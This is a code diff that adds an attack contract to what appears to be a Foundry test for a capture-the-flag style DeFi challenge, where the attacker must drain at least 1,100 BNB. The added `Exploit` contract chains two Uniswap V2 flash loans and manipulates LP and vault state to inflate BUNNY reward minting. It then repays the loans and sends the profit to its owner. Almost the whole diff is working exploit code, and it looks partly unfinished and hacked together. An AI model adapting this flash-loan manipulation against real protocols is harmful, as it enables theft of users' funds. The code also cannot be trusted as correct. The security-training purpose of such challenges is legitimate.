@@ -154,6 +154,16 @@ contract Testing is Test {
         vm.startPrank(attacker,attacker);
 
         // implement solution here
+        Exploit exploit = new Exploit(address(uniFactory), address(uniRouter), address(usdcBnbPair), address(bnbBunnyPair), address(usdc), address(dai), address(bunny), address(bnb),  address(vault),  address(bunnyMinter), address(zapBSC));
+        exploit.pwn();
+        //vm.stopPrank();
+
+        /*vm.roll(block.number+1);
+        vm.startPrank(attacker,attacker);
+        exploit.pwn();*/
+
+        //Exploit _exploit = new Exploit(address(uniFactory), address(uniRouter), address(usdcBnbPair), address(bnbBunnyPair), address(usdc), address(dai), address(bunny), address(bnb),  address(vault),  address(bunnyMinter), address(zapBSC));
+        //_exploit.pwn();
 
         vm.stopPrank();
         validation();
@@ -165,6 +175,134 @@ contract Testing is Test {
         // attacker steals at least 1100 BNB - only allowed 2 blocks to run exploit
         assertGe(bnb.balanceOf(attacker),1_100e18);
 
+    }
+
+}
+
+contract Exploit {
+
+    address owner;
+    IUniswapV2Factory uniFactory;
+    IUniswapV2Router02 uniRouter;
+    IUniswapV2Pair usdcBnbPair;
+    IUniswapV2Pair bnbBunnyPair;
+    IUniswapV2Pair usdcDaiPair;
+    IUniswapV2Pair daiBnbPair;
+    IWETH weth;
+    Token usdc;
+    Token dai;
+    Token bunny;
+    Token bnb;
+    AutoCompoundVault vault;
+    BunnyMinter bunnyMinter;
+    ZapBSC zapBSC;
+    bool firstFlashLoan;
+    bool secondFlashLoan;
+    uint256 repayUSDC;
+    uint256 repayBNB;
+
+    constructor(address _uniFactory, address _uniRouter, address _usdcBnbPair, address _bnbBunnyPair, address _usdc, address _dai, address _bunny, address _bnb,  address _vault,  address _bunnyMinter, address _zapBSC){
+        owner= msg.sender;
+        uniFactory = IUniswapV2Factory(_uniFactory);
+        uniRouter = IUniswapV2Router02(_uniRouter);
+        usdcBnbPair = IUniswapV2Pair(_usdcBnbPair);
+        bnbBunnyPair = IUniswapV2Pair(_bnbBunnyPair);
+        usdc = Token(_usdc);
+        dai = Token(_dai);    
+        bunny = Token(_bunny);
+        bnb  = Token(_bnb);
+        usdcDaiPair = IUniswapV2Pair(uniFactory.getPair(address(usdc),address(dai)));
+        daiBnbPair = IUniswapV2Pair(uniFactory.getPair(address(dai),address(bnb)));
+        vault = AutoCompoundVault(_vault);
+        bunnyMinter = BunnyMinter(_bunnyMinter);
+        zapBSC = ZapBSC(_zapBSC);
+        usdc.approve(address(uniRouter),type(uint).max);
+        bnb.approve(address(uniRouter),type(uint).max);
+        bunny.approve(address(uniRouter),type(uint).max);
+        usdcBnbPair.approve(address(uniRouter),type(uint).max);
+        usdcBnbPair.approve(address(vault),type(uint).max);
+
+    }
+
+    function uniswapV2Call(address _address,uint amount0Out,uint amount1Out, bytes memory data) external {
+        //console.log("test");
+        
+        if(!firstFlashLoan){
+            firstFlashLoan = true;
+            repayUSDC = (amount0Out * 103 /100)+1;
+            daiBnbPair.swap(2_999e18,0,address(this), new bytes(1));
+        }
+
+        if(!secondFlashLoan){
+            //secondFlashLoan = true;
+            repayBNB = (amount0Out * 103 /100)+1;
+            console.log("test");
+            uniRouter.addLiquidity(
+            address(usdc),address(bnb),
+            usdc.balanceOf(address(this)),
+            bnb.balanceOf(address(this)),
+            0,0,
+            address(this),block.timestamp);
+
+            //console.log("test");
+            vault.deposit(1e18);
+            usdcBnbPair.transfer(address(usdcBnbPair),usdcBnbPair.balanceOf(address(this)));
+
+            
+            
+            //console.log("test");
+            vault.withdrawAllAndEarn();
+            
+            //hope to have enough bunny for repay all flash loans
+            address[] memory path = new address[](2);
+            path[0] = address(bunny);
+            path[1] = address(bnb);
+            //console.log("test");
+            uniRouter.swapExactTokensForTokens(
+                bunny.balanceOf(address(this)), 
+                0, path, address(this), block.timestamp
+            );
+
+            path[0] = address(bnb);
+            path[1] = address(usdc);
+            //console.log("test");
+            uniRouter.swapTokensForExactTokens(
+                repayUSDC,
+                type(uint256).max, path, address(this), block.timestamp
+            );
+
+            //console.log("test");
+            uniRouter.removeLiquidity(
+            address(usdc),address(bnb),
+            usdcBnbPair.balanceOf(address(this)),
+            0,0,
+            address(this),block.timestamp);
+
+            
+            //console.log("test");
+            usdc.transfer(address(usdcDaiPair),repayUSDC);
+            
+
+            path[0] = address(usdc);
+            path[1] = address(bnb);
+            //console.log("test");
+            uniRouter.swapExactTokensForTokens(
+                usdc.balanceOf(address(this)), 
+                0, path, address(this), block.timestamp
+            );
+            //console.log("test");
+            bnb.transfer(address(daiBnbPair),repayBNB);
+            //console.log("test");
+            bnb.transfer(owner,bnb.balanceOf(address(this)));
+            firstFlashLoan=false;
+            secondFlashLoan = true;
+        }
+    }
+    function pwn() external returns (address){
+        //console.log("test");
+        //console.log(usdcDaiPair);
+        //console.log("daiBnbPair : ",daiBnbPair);
+        usdcDaiPair.swap(900_000e18,0,address(this), new bytes(1));
     }
 
 }
